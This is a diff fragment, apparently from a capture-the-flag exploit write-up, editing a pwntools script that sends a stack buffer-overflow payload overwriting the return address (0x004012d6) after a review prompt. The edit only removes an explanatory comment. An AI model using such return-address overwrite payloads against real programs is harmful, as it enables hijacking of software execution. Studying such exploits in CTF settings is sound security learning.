@@ -194,7 +194,7 @@ p.recvuntil(b'Please write a review of your experience today:')
 ret_override = 0x004012d6
 
 payload = b'a' * (40 + 8 + 8) + pwn.p64(ret_override)
-p.sendline(payload)  # this will send the pc back to middle of main so we can change other bits
+p.sendline(payload)
 p.recvall()
 ```
 
